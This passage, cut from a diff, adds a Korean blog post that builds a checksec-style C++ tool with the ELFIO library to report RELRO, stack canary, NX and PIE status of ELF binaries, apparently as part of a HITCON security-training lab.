+        <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">reader</span><span class="p">.</span><span class="n">get_class</span><span class="p">()</span> <span class="o">==</span> <span class="n">ELFCLASS32</span> <span class="o">?</span> <span class="s">"32"</span> <span class="o">:</span> <span class="s">"64"</span><span class="p">)</span>
+        <span class="o">&lt;&lt;</span> <span class="s">"-"</span>
+        <span class="o">&lt;&lt;</span> <span class="n">endians</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_encoding</span><span class="p">()]</span>
+        <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"    RELRO:    "</span> <span class="o">&lt;&lt;</span> <span class="n">get_relro</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"    Stack:    "</span> <span class="o">&lt;&lt;</span> <span class="n">get_canary</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">get_relro</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">relro</span><span class="p">{</span><span class="s">"No RELRO"</span><span class="p">};</span>
+
+        <span class="c1">// search segment headers</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">segment</span><span class="o">*</span> <span class="n">seg</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">PT_GNU_RELRO</span> <span class="o">==</span> <span class="n">seg</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="n">relro</span> <span class="o">=</span> <span class="s">"Partial RELRO"</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="c1">// search dynamic sections</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">SHT_DYNAMIC</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">dynamic_section_accessor</span> <span class="n">dynamic</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
+                <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entries_num</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">tag</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">value</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">str</span><span class="p">;</span>
+                    <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entry</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="n">DT_FLAGS</span> <span class="o">==</span> <span class="n">tag</span> <span class="o">&amp;&amp;</span> <span class="n">value</span> <span class="o">==</span> <span class="n">DF_BIND_NOW</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">relro</span> <span class="o">=</span> <span class="s">"Full RELRO"</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="n">relro</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">get_canary</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">canary</span><span class="p">{</span><span class="s">"No canary found"</span><span class="p">};</span>
+
+        <span class="c1">//</span>
+        <span class="c1">// canary check</span>
+        <span class="c1">//</span>
+        <span class="n">get_symbols</span><span class="p">();</span>
+        <span class="k">for</span><span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="p">[</span><span class="n">symbol</span><span class="p">,</span> <span class="n">addr</span><span class="p">]</span> <span class="o">:</span> <span class="n">symbols</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">symbol</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"__stack_chk_fail"</span><span class="p">)</span> <span class="o">!=</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">::</span><span class="n">npos</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">canary</span> <span class="o">=</span> <span class="s">"Canary found"</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="nl">private:</span>
+    <span class="kt">void</span> <span class="n">get_symbols</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">SHT_SYMTAB</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="o">||</span> <span class="n">SHT_DYNSYM</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">symbol_section_accessor</span> <span class="n">symbol</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
+                <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">symbol</span><span class="p">.</span><span class="n">get_symbols_num</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">name</span><span class="p">;</span>
+                    <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Addr</span> <span class="n">value</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span>  <span class="n">size</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bind</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">type</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">section</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">other</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                    <span class="n">symbol</span><span class="p">.</span><span class="n">get_symbol</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">bind</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="n">section</span><span class="p">,</span> <span class="n">other</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">name</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span>
+                    <span class="p">{</span>
+                        <span class="n">symbols</span><span class="p">.</span><span class="n">emplace</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>   <span class="c1">// end of for</span>
+    <span class="p">}</span>
+
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">try</span>
+    <span class="p">{</span>
+        <span class="n">ELF</span> <span class="n">e</span><span class="p">{</span><span class="s">"/tmp/hitcon/LAB/lab4/ret2lib"</span><span class="p">};</span>
+        <span class="c1">// ELF e{"/usr/sbin/chroot"};</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">exception</span><span class="o">&amp;</span> <span class="n">e</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Exception: "</span> <span class="o">&lt;&lt;</span> <span class="n">__FUNCTION__</span> <span class="o">&lt;&lt;</span> <span class="s">" "</span> <span class="o">&lt;&lt;</span> <span class="n">e</span><span class="p">.</span><span class="n">what</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/stack.png" alt="full" /></p>
+
+<p><br /></p>
+<h2 id="nx"><strong>NX</strong></h2>
+
+<p>NX bit의 활성화 여부는 segment들 중 GNU_STACK 형식의 Flag를 보고 알 수 있다. 만약 Flag의 permission이 RWX가 아닐 경우 NX bit가 활성화된 것이다.
+코드는 아래와 같다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="nf">get_nx</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">nxbit</span><span class="p">{</span><span class="s">"NX disabled"</span><span class="p">};</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">ELFIO</span><span class="o">::</span><span class="n">segment</span> <span class="o">*</span><span class="n">seg</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">PT_GNU_STACK</span> <span class="o">==</span> <span class="n">seg</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="mi">7</span> <span class="o">!=</span> <span class="n">seg</span><span class="o">-&gt;</span><span class="n">get_flags</span><span class="p">())</span>
+        <span class="p">{</span>
+            <span class="n">nxbit</span> <span class="o">=</span> <span class="s">"NX enabled"</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">nxbit</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+이제 NX 결과까지 출력해보자. 아래는 main 함수에서 출력을 추가하고 함수 get_nx()를 추가한 코드 및 그 실행 결과이다.</p>
+
+<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main%202.cpp">main.cpp</a></p>
+
+<p><img src="/assets/images/nx.png" alt="full" /></p>
+
+<p><br /></p>
+<h2 id="pie"><strong>PIE</strong></h2>
+
+<p>PIE는 아래 규칙으로 알아낼 수 있다.</p>
+
+<p><img src="/assets/images/bpsec.png" alt="full" /></p>
+
+<p>출처: <a href="https://bpsecblog.wordpress.com/2016/06/28/memory_protect_linux_5/">https://bpsecblog.wordpress.com/2016/06/28/memory_protect_linux_5/</a></p>
+
+<p><br />
+ELF File Format의 Type은 아래의 코드로 알아낼 수 있다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">ET_EXEC</span> <span class="o">==</span> <span class="n">reader</span><span class="p">.</span><span class="n">get_type</span><span class="p">()){</span><span class="n">pie</span> <span class="o">=</span> <span class="s">"No PIE"</span><span class="p">;}</span>
+<span class="k">else</span> <span class="p">{</span><span class="n">pie</span> <span class="o">=</span> <span class="s">"Not ELF file"</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<p><br />
+Dynamic Section을 탐색하는 것은 이전 Relro에서 사용한 방법과 동일하며, tag 값을 확인하는 부분만 다르다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="nf">get_pie</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">pie</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">ET_EXEC</span> <span class="o">==</span> <span class="n">reader</span><span class="p">.</span><span class="n">get_type</span><span class="p">()){</span><span class="n">pie</span> <span class="o">=</span> <span class="s">"No PIE"</span><span class="p">;}</span>
+    <span class="k">else</span> <span class="p">{</span><span class="n">pie</span> <span class="o">=</span> <span class="s">"Not ELF file"</span><span class="p">;}</span>
+
+    <span class="c1">// search dynamic sections</span>
+    <span class="kt">bool</span> <span class="n">find</span><span class="p">{</span><span class="nb">false</span><span class="p">};</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">ELFIO</span><span class="o">::</span><span class="n">section</span><span class="o">*</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">SHT_DYNAMIC</span> <span class="o">==</span> <span class="n">sec</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+        <span class="p">{</span>
+            <span class="n">find</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+            <span class="n">ELFIO</span><span class="o">::</span><span class="n">dynamic_section_accessor</span> <span class="n">dynamic</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">sec</span><span class="p">);</span>
+            <span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entries_num</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">tag</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Xword</span> <span class="n">value</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+                <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">str</span><span class="p">;</span>
+                <span class="n">dynamic</span><span class="p">.</span><span class="n">get_entry</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">DT_DEBUG</span> <span class="o">==</span> <span class="n">tag</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="k">if</span><span class="p">(</span><span class="n">ET_DYN</span> <span class="o">==</span> <span class="n">reader</span><span class="p">.</span><span class="n">get_type</span><span class="p">())</span>
+                    <span class="p">{</span>
+                        <span class="n">pie</span> <span class="o">=</span> <span class="s">"PIE enabled"</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">find</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">ET_DYN</span> <span class="o">==</span> <span class="n">reader</span><span class="p">.</span><span class="n">get_type</span><span class="p">())</span>
+        <span class="p">{</span>
+            <span class="n">pie</span> <span class="o">=</span> <span class="s">"DSO"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">pie</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+아래는 지금까지 구현된 모든 코드들과 그 실행 결과이다.</p>
+
+<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main%203.cpp">main.cpp</a></p>
+
+<p><img src="/assets/images/pie.png" alt="full" /></p>
+
+<p><br />
+추가된 get_entry() 함수 및 연관된 함수들의 코드는 아래와 같다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="nf">get_entry</span><span class="p">(</span> <span class="n">Elf_Xword</span>   <span class="n">index</span><span class="p">,</span>
+                <span class="n">Elf64_Addr</span><span class="o">&amp;</span> <span class="n">offset</span><span class="p">,</span>
+                <span class="n">Elf_Xword</span><span class="o">&amp;</span>  <span class="n">info</span><span class="p">,</span>
+                <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">symbol</span><span class="p">,</span>
+                <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">type</span><span class="p">,</span>
+                <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">symbolName</span><span class="p">)</span> <span class="k">const</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&gt;=</span> <span class="n">get_entries_num</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">// Is index valid</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// get symbol by index</span>
+    <span class="n">Elf_Sxword</span>  <span class="n">addend</span><span class="p">;</span>
+    <span class="n">get_entry</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="n">addend</span><span class="p">);</span>
+
+    <span class="c1">// get symbol name</span>
+    <span class="n">symbol_section_accessor</span> <span class="nf">symbols</span><span class="p">(</span><span class="n">elf_file</span><span class="p">,</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="n">get_symbol_table_index</span><span class="p">()]);</span>
+
+    <span class="n">Elf64_Addr</span>  <span class="n">symbolValue</span><span class="p">;</span>
+    <span class="n">Elf_Xword</span>     <span class="n">size</span><span class="p">;</span>
+    <span class="n">Elf_Half</span>      <span class="n">section</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bind</span><span class="p">,</span> <span class="n">symbolType</span><span class="p">,</span> <span class="n">other</span><span class="p">;</span>
+    <span class="n">symbols</span><span class="p">.</span><span class="n">get_symbol</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">symbolName</span><span class="p">,</span> <span class="n">symbolValue</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">bind</span><span class="p">,</span> <span class="n">symbolType</span><span class="p">,</span> <span class="n">section</span><span class="p">,</span> <span class="n">other</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">get_class</span><span class="p">()</span> <span class="o">==</span> <span class="n">ELFCLASS32</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_REL</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">generic_get_entry_rel</span><span class="o">&lt;</span><span class="n">Elf32_Rel</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_RELA</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">generic_get_entry_rela</span><span class="o">&lt;</span><span class="n">Elf32_Rela</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_REL</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">generic_get_entry_rel</span><span class="o">&lt;</span><span class="n">Elf64_Rel</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">SHT_RELA</span> <span class="o">==</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">generic_get_entry_rela</span><span class="o">&lt;</span><span class="n">Elf64_Rela</span><span class="o">&gt;</span><span class="p">(</span> <span class="n">index</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">symbol</span><span class="p">,</span> <span class="n">type</span> <span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+<span class="err">}</span>
+</code></pre></div></div>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span> <span class="o">&lt;</span><span class="k">class</span> <span class="nc">T</span><span class="p">&gt;</span>
+<span class="kt">void</span> <span class="nf">generic_get_entry_rel</span><span class="p">(</span> <span class="n">Elf_Xword</span>   <span class="n">index</span><span class="p">,</span>
+                            <span class="n">Elf64_Addr</span><span class="o">&amp;</span> <span class="n">offset</span><span class="p">,</span>
+                            <span class="n">Elf_Xword</span><span class="o">&amp;</span>   <span class="n">info</span><span class="p">,</span>
+                            <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">symbol</span><span class="p">,</span>
+                            <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">type</span> <span class="p">)</span> <span class="k">const</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="n">endianess_convertor</span><span class="o">&amp;</span> <span class="n">convertor</span> <span class="o">=</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">get_convertor</span><span class="p">();</span>
+
+    <span class="k">const</span> <span class="n">T</span><span class="o">*</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="k">const</span> <span class="n">T</span><span class="o">*&gt;</span><span class="p">(</span>
+        <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_data</span><span class="p">()</span> <span class="o">+</span>
+        <span class="n">index</span> <span class="o">*</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_entry_size</span><span class="p">()</span> <span class="p">);</span>
+    <span class="n">offset</span>        <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_offset</span> <span class="p">);</span>
+    <span class="n">info</span>          <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="p">);</span>
+    <span class="n">Elf_Xword</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="p">);</span>
+    <span class="n">symbol</span>        <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_sym</span><span class="p">(</span> <span class="n">tmp</span> <span class="p">);</span>
+    <span class="n">type</span>          <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_type</span><span class="p">(</span> <span class="n">tmp</span> <span class="p">);</span>
+<span class="err">}</span>
+
+<span class="k">template</span> <span class="o">&lt;</span><span class="k">class</span> <span class="nc">T</span><span class="p">&gt;</span>
+<span class="kt">void</span> <span class="nf">generic_get_entry_rela</span><span class="p">(</span> <span class="n">Elf_Xword</span>   <span class="n">index</span><span class="p">,</span>
+                             <span class="n">Elf64_Addr</span><span class="o">&amp;</span> <span class="n">offset</span><span class="p">,</span>
+                             <span class="n">Elf_Xword</span><span class="o">&amp;</span>   <span class="n">info</span><span class="p">,</span>
+                             <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">symbol</span><span class="p">,</span>
+                             <span class="n">Elf_Word</span><span class="o">&amp;</span>   <span class="n">type</span> <span class="p">)</span> <span class="k">const</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="n">endianess_convertor</span><span class="o">&amp;</span> <span class="n">convertor</span> <span class="o">=</span> <span class="n">elf_file</span><span class="p">.</span><span class="n">get_convertor</span><span class="p">();</span>
+
+    <span class="k">const</span> <span class="n">T</span><span class="o">*</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="k">const</span> <span class="n">T</span><span class="o">*&gt;</span><span class="p">(</span>
+        <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_data</span><span class="p">()</span> <span class="o">+</span>
+        <span class="n">index</span> <span class="o">*</span> <span class="n">relocation_section</span><span class="o">-&gt;</span><span class="n">get_entry_size</span><span class="p">()</span> <span class="p">);</span>
+    <span class="n">offset</span>        <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_offset</span> <span class="p">);</span>
